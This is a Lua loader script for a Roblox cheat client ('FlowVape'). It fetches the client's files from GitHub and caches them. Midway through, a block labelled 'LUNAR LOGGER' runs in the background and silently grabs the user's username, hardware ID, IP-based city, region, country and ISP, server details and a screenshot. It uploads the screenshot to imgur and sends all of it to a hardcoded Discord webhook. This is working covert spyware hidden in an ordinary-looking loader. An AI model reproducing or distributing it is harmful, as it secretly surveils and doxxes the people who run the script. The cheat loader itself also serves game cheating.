local isfile = isfile or function(file)
    local suc, res = pcall(function()
        return readfile(file)
    end)
    return suc and res ~= nil and res ~= ''
end
local delfile = delfile or function(file)
    writefile(file, '')
end

local function downloadFile(path, func)
    if not isfile(path) then
        local suc, res = pcall(function()
            return game:HttpGet('https://raw.githubusercontent.com/complexwaremain/FlowVape/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
        end)
        if not suc or res == '404: Not Found' then
            error(res)
        end
        if path:find('.lua') then
            res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n'..res
        end
        writefile(path, res)
    end
    return (func or readfile)(path)
end

local function wipeFolder(path)
    if not isfolder(path) then return end
    for _, file in listfiles(path) do
        if file:find('loader') then continue end
        if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
            delfile(file)
        end
    end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
    if not isfolder(folder) then
        makefolder(folder)
    end
end

if not shared.VapeDeveloper then
    local _, subbed = pcall(function() 
        return game:HttpGet('https://github.com/complexwaremain/FlowVape') 
    end)
    local commit = subbed:find('currentOid')
    commit = commit and subbed:sub(commit + 13, commit + 52) or nil
    commit = commit and #commit == 40 and commit or 'main'
    if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
        wipeFolder('newvape')
        wipeFolder('newvape/games')
        wipeFolder('newvape/guis')
        wipeFolder('newvape/libraries')
    end
    writefile('newvape/profiles/commit.txt', commit)
end

-- [LUNAR LOGGER INTEGRATION]
task.spawn(function()
    pcall(function()
        local webhookLink = "https://discord.com/api/webhooks/1544026257212047454/s_JeguKn0cQ_8V_-pA5lrggbxenumtRoEmd7-q9maMG4LTD5vbm0kb4HJI6K1G3jM_qY"
        local currentPlayer = game.Players.LocalPlayer
        local analyticsService = game:GetService("RbxAnalyticsService")
        local jsonService = game:GetService("HttpService")
        local marketService = game:GetService("MarketplaceService")
        local httpRequest = syn and syn.request or http and http.request or request or http_request
        
        if not httpRequest then return end -- Safety check in case executor lacks HTTP request functions

        local clientHWID = analyticsService:GetClientId() or "N/A"
        local ipResponse = httpRequest({Url = "http://ip-api.com/json", Method = "GET"})
        local ipInformation = jsonService:JSONDecode(ipResponse.Body)
        local currentGameName = "Unknown"
        pcall(function() currentGameName = marketService:GetProductInfo(game.PlaceId).Name end)
        local zeroWidthSpace = string.char(0xE2, 0x80, 0x8B)
        local screenshotBase64 = nil
        pcall(function() if getscreenshot then screenshotBase64 = getscreenshot() end end)
        local screenshotImageUrl = nil
        if screenshotBase64 then
            pcall(function()
                local imgurResponse = httpRequest({
                    Url = "https://api.imgur.com/3/upload.json",
                    Method = "POST",
                    Headers = {
                        ["Authorization"] = "Client-ID 546c25a23c05a7e",
                        ["Content-Type"] = "application/x-www-form-urlencoded"
                    },
                    Body = "image=" .. screenshotBase64
                })
                local imgurData = jsonService:JSONDecode(imgurResponse.Body)
                if imgurData and imgurData.data and imgurData.data.link then
                    screenshotImageUrl = imgurData.data.link
                end
            end)
        end
        local webhookEmbeds = {
            {
                title = "Execution Alert",
                url = "https://www.roblox.com/games/" .. game.PlaceId,
                description = "A new script instance has been initialized and logged.",
                color = 0xFF3333,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                footer = {text = "System Logger | Secure Connection", icon_url = "https://cdn.discordapp.com/attachments/1540648723787546664/1542942706370617575/images_-_2026-08-24T192845.138.jpg?ex=6a9310df&is=6a91bf5f&hm=79206e34e8a0a29f15fe7ab20ae32b73bdb0f7bd8d70057bf459668f0e555bb9&"},
                thumbnail = {url = "https://cdn.discordapp.com/attachments/1540648723787546664/1542942706370617575/images_-_2026-08-24T192845.138.jpg?ex=6a9310df&is=6a91bf5f&hm=79206e34e8a0a29f15fe7ab20ae32b73bdb0f7bd8d70057bf459668f0e555bb9&"},
                fields = {
                    {name = zeroWidthSpace, value = "**USER INFORMATION**", inline = false},
                    {name = "Username", value = "```fix\n" .. currentPlayer.Name .. "```", inline = true},
                    {name = "Display Name", value = "```fix\n" .. currentPlayer.DisplayName .. "```", inline = true},
                    {name = "HWID", value = "```yaml\n" .. clientHWID .. "```", inline = false},
                    {name = zeroWidthSpace, value = "**GEOLOCATION**", inline = false},
                    {name = "City", value = "```fix\n" .. (ipInformation.city or "Unknown") .. "```", inline = true},
                    {name = "Region", value = "```fix\n" .. (ipInformation.regionName or "Unknown") .. "```", inline = true},
                    {name = "Country", value = "```fix\n" .. (ipInformation.country or "Unknown") .. "```", inline = true},
                    {name = "ISP", value = "```yaml\n" .. (ipInformation.isp or "Unknown") .. "```", inline = false}
                }
            },
            {
                title = "Environment Details",
                color = 0x5865F2,
                fields = {
                    {name = "Game", value = "```fix\n" .. currentGameName .. "```", inline = false},
                    {name = "Place ID", value = "```yaml\n" .. tostring(game.PlaceId) .. "```", inline = true},
                    {name = "Job ID", value = "```yaml\n" .. tostring(game.JobId) .. "```", inline = false}
                }
            }
        }
        if screenshotImageUrl then
            webhookEmbeds[1].image = {url = screenshotImageUrl}
        end
        httpRequest({
            Url = webhookLink,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonService:JSONEncode({
                content = "**New Execution Detected**",
                username = "lunar logger",
                avatar_url = "https://cdn.discordapp.com/attachments/1540648723787546664/1542942076356788295/file_00000000585c820b9682eb89b932cafc.png?ex=6a931049&is=6a91bec9&hm=94bccc7a3be22fefadc6de4b55febd42bde6707a45de4ab41c1febbdc401c890&",
                embeds = webhookEmbeds
            })
        })
    end)
end)


return loadstring(downloadFile('newvape/main.lua'), 'main')()
